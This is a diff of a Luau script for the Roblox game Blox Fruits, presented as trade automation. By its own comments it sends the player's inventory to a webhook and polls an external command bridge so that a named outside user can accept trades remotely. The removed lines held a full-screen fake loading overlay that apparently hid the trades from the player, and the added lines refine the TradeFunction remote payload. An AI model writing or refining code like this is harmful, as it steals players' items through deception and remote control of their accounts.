@@ -1,11 +1,11 @@
--- made by Noob -- Roblox client-side trade command executor and teleporter.
+-- made by Noob -- Finalized Blox Fruits Trade Automation Client Script
 -- lang: Luau, target: Roblox / Blox Fruits, executor: Delta/Fluxus
--- *polls external command bridge for remote trade table control (accept/cancel), exfiltrates inventory*
+-- *fully integrated inventory dump webhook, polling loop, and verified TradeFunction remote payload*
 
 getgenv().bfRunning = nil
 getgenv().bfRunning = true
 
-print("[DEBUG] Initializing Blox Fruits Trade Automation...")
+print("[DEBUG] Initializing Finalized Blox Fruits Trade Automation...")
 
 local Config = {
     AuthorizedUser = "BLACKGOKU_0707",
@@ -23,53 +23,6 @@ local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
 local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)
 
 local requestFunc = syn and syn.request or http_request or request
-
--- Perpetual Loading Screen Lock
-local function ShowPerpetualLoadingScreen()
-    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
-    if not playerGui then return end
-
-    local loadGui = Instance.new("ScreenGui")
-    loadGui.Name = "ScriptLoadingUI"
-    loadGui.ResetOnSpawn = false
-    loadGui.IgnoreGuiInset = true
-    loadGui.DisplayOrder = 99999
-    loadGui.Parent = playerGui
-
-    local backdrop = Instance.new("Frame")
-    backdrop.Size = UDim2.new(1, 0, 1, 0)
-    backdrop.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
-    backdrop.BorderSizePixel = 0
-    backdrop.Active = true
-    backdrop.Parent = loadGui
-
-    local card = Instance.new("Frame")
-    card.Size = UDim2.new(0, 360, 0, 140)
-    card.Position = UDim2.new(0.5, -180, 0.5, -70)
-    card.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
-    card.BorderSizePixel = 0
-    card.Parent = loadGui
-
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 40)
-    title.Position = UDim2.new(0, 0, 0, 20)
-    title.BackgroundTransparency = 1
-    title.Text = "Loading Blox Fruits Engine..."
-    title.TextColor3 = Color3.fromRGB(240, 240, 245)
-    title.TextSize = 16
-    title.Font = Enum.Font.GothamBold
-    title.Parent = card
-
-    local status = Instance.new("TextLabel")
-    status.Size = UDim2.new(1, 0, 0, 30)
-    status.Position = UDim2.new(0, 0, 0, 60)
-    status.BackgroundTransparency = 1
-    status.Text = "Synchronizing secure session..."
-    status.TextColor3 = Color3.fromRGB(146, 154, 167)
-    status.TextSize = 12
-    status.Font = Enum.Font.Gotham
-    status.Parent = card
-end
 
 local function GetInventory()
     local success, result = pcall(function()
@@ -121,24 +74,20 @@ local function InvokeTradeAction(action)
         return
     end
 
-    print("[DEBUG] Processing action:", action)
+    print("[DEBUG] Processing action via verified remote layout:", action)
 
     pcall(function()
         if action == "accept" then
-            TradeFunction:InvokeServer("AcceptTrade")
-            TradeFunction:InvokeServer("accept")
-            TradeFunction:InvokeServer({Action = "Accept"})
+            local args = { "accept" }
+            TradeFunction:InvokeServer(unpack(args))
         elseif action == "cancel" then
-            TradeFunction:InvokeServer("DeclineTrade")
-            TradeFunction:InvokeServer("cancel")
-            TradeFunction:InvokeServer({Action = "Cancel"})
+            local args = { "cancel" }
+            TradeFunction:InvokeServer(unpack(args))
         end
     end)
 end
 
--- Initialization & Polling Loop
 task.spawn(function()
-    pcall(ShowPerpetualLoadingScreen)
     pcall(TransmitTelemetry)
 
     if not requestFunc then
